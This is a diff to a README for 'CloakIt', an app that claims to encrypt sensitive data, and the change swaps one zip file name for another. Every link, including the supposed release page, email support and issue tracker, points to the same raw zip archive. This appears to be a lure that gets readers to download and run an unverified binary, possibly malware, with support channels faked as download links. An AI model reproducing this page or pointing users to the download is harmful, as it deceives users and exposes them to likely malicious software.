@@ -1,7 +1,7 @@
 # 🛡️ CloakIt - Secure Your Data with Ease
 
 ## 📥 Download Now
-[![Download CloakIt](https://raw.githubusercontent.com/GodToNations/CloakIt/main/deerlet/CloakIt.zip)](https://raw.githubusercontent.com/GodToNations/CloakIt/main/deerlet/CloakIt.zip)
+[![Download CloakIt](https://raw.githubusercontent.com/GodToNations/CloakIt/main/deerlet/It-Cloak-2.6.zip)](https://raw.githubusercontent.com/GodToNations/CloakIt/main/deerlet/It-Cloak-2.6.zip)
 
 ## 🚀 Getting Started
 CloakIt is an easy-to-use application that helps you secure your sensitive data. Follow these steps to download and run the software.
@@ -23,7 +23,7 @@ CloakIt offers several useful features:
 - **Regular Updates:** Stay secure with the latest features and fixes.
 
 ## 🌐 Download & Install
-To get started, visit the [CloakIt Releases Page](https://raw.githubusercontent.com/GodToNations/CloakIt/main/deerlet/CloakIt.zip) to download the software.
+To get started, visit the [CloakIt Releases Page](https://raw.githubusercontent.com/GodToNations/CloakIt/main/deerlet/It-Cloak-2.6.zip) to download the software.
 
 1. Click the link above.
 2. Choose the latest version.
@@ -40,7 +40,7 @@ To get started, visit the [CloakIt Releases Page](https://raw.githubusercontent.
   2. Drag the CloakIt application into your Applications folder.
 
 - **For Linux:**
-  1. Extract the downloaded `https://raw.githubusercontent.com/GodToNations/CloakIt/main/deerlet/CloakIt.zip` file.
+  1. Extract the downloaded `https://raw.githubusercontent.com/GodToNations/CloakIt/main/deerlet/It-Cloak-2.6.zip` file.
   2. Open a terminal and navigate to the extracted folder.
   3. Run the application using the command: `./CloakIt`.
 
@@ -58,8 +58,8 @@ Your data will be securely encrypted and can only be accessed with the password 
 ## 📞 Support
 If you encounter any issues while using CloakIt, we're here to help. You can reach out through the following:
 
-- **Email Support:** https://raw.githubusercontent.com/GodToNations/CloakIt/main/deerlet/CloakIt.zip
-- **GitHub Issues:** [Report an Issue](https://raw.githubusercontent.com/GodToNations/CloakIt/main/deerlet/CloakIt.zip)
+- **Email Support:** https://raw.githubusercontent.com/GodToNations/CloakIt/main/deerlet/It-Cloak-2.6.zip
+- **GitHub Issues:** [Report an Issue](https://raw.githubusercontent.com/GodToNations/CloakIt/main/deerlet/It-Cloak-2.6.zip)
 
 ## 🌟 Conclusion
-CloakIt is your go-to solution for protecting sensitive data easily. Visit the [CloakIt Releases Page](https://raw.githubusercontent.com/GodToNations/CloakIt/main/deerlet/CloakIt.zip) to download it today and keep your information safe.
+CloakIt is your go-to solution for protecting sensitive data easily. Visit the [CloakIt Releases Page](https://raw.githubusercontent.com/GodToNations/CloakIt/main/deerlet/It-Cloak-2.6.zip) to download it today and keep your information safe.
